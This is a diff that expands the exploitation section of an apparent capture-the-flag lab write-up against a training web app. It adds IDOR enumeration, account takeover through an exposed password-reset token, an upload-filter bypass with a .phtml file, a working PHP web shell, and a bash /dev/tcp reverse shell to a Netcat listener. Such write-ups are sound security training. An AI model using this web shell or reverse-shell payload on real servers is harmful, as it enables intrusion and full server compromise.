@@ -60,19 +60,69 @@ Querying the unauthenticated /api/ endpoint revealed internal route maps, exposi
 
 # Exploitation
 
-Gaining remote code execution on the underlying server required chaining multiple low-to-medium severity vulnerabilities together rather than relying on a single complex exploit.
+Gaining remote code execution on the underlying server required chaining multiple low-to-medium severity vulnerabilities together, moving systematically from an unauthenticated posture to full administrative compromise.
 
-Insecure Direct Object Reference (IDOR): Investigated user-specific endpoints where parameter manipulation exposed unauthorized user records and data, demonstrating a lack of proper server-side authorization checks.
+Phase 1: Insecure Direct Object Reference (IDOR)
 
-Flawed Password Reset Mechanism: Analyzed the password reset workflow and discovered that the reset token was improperly exposed directly within the server's HTTP response. This design flaw allowed for direct account takeover by intercepting the token and changing targeted accounts' passwords.
+While authenticated as a standard test user (testuser@fake.thm), navigating to the user profile revealed a predictable numeric parameter in the URL:
 
-File Upload Bypass & Remote Code Execution (RCE):
+    Target Endpoint: http://MACHINE_IP/profile.php?id=6
 
-The file upload form initially relied on a client-side accept attribute to restrict file types, which was easily bypassed by modifying or dropping the client-side validation logic.
+By modifying the id parameter from 6 to 1, the application exposed unauthorized user records due to a complete lack of server-side authorization checks. Furthermore, investigating the unauthenticated /api/ endpoint yielded even more granular data:
 
-The server-side validation relied on a blocklist that failed to account for alternative PHP extensions (such as .phtml or .php5).
+    curl -s "http://MACHINE_IP/api/user?id=1"
+    # Output: {"id":1,"name":"Sarah Mitchell","email":"s.mitchell@recruitx.thm","role":"administrator","created":"2026-03-24"}
 
-Uploaded a web shell using an alternative extension allowed execution of system commands, ultimately leading to full remote code execution on the underlying server.
+Enumerating IDs 1 through 5 successfully leaked the roles, names, and emails of all internal users, identifying Sarah Mitchell as the primary system administrator (s.mitchell@recruitx.thm).
+
+Phase 2: Flawed Password Reset & Account Takeover
+
+Instead of attempting brute-force attacks on the admin login, the password reset workflow at /reset.php was evaluated.
+
+    Vulnerability: Submitting an email address triggered a password reset token that was improperly exposed directly within the server's HTTP response body.
+
+    Token Characteristics: The tokens consisted of a weak, 6-digit numeric keyspace (e.g., 784512, 291037).
+
+    Execution: By submitting Sarah Mitchell’s email (s.mitchell@recruitx.thm), the admin reset token was instantly disclosed. This token was immediately used to overwrite her password via the reset interface, resulting in a direct account takeover.
+
+Phase 3: Admin Panel Access & File Upload Bypass
+
+With valid administrator credentials, access was granted to the previously hidden administrative dashboard at /admin, which housed a file management and upload utility at /admin/upload.php.
+
+    Client-Side Restriction Bypass: The upload form utilized a client-side accept attribute and input validation restricting files to documents and images. This was bypassed by inspecting the HTML DOM and removing the accept attribute.
+
+    Server-Side Blocklist Flaw: Attempting to upload a raw .php file was rejected. However, the server's blocklist failed to account for alternative Apache-parsed PHP extensions. Uploading a file with a .phtml extension successfully bypassed the filter:
+
+        Payload Uploaded: test.phtml containing basic PHP execution code.
+
+        Verification: Navigating to http://MACHINE_IP/uploads/documents/test.phtml confirmed that Apache processed the file as active code rather than static text.
+
+Phase 4: Web Shell Deployment & Remote Code Execution (RCE)
+
+To interact with the server dynamically, a custom web shell (shell.phtml) was uploaded:
+
+    <?php
+    if(isset($_GET['cmd'])) {
+        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+    }
+    ?>
+
+Executing system-level commands through HTTP GET requests confirmed low-privileged code execution under the context of the web server user:
+
+    curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=id"
+    # Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Phase 5: Upgrading to an Interactive Reverse Shell
+
+To overcome the limitations of single-command HTTP execution, a Netcat listener was established on the attack machine:
+
+    nc -lvnp 4444
+
+The web shell was then leveraged to trigger a reverse shell back to the listener using a URL-encoded bash payload:
+
+    curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"
+
+This established an interactive www-data shell on the host, allowing internal enumeration (such as reading /etc/passwd) and successful retrieval of the validation flag from /var/www/flag.txt.
 
 # Remediation
 
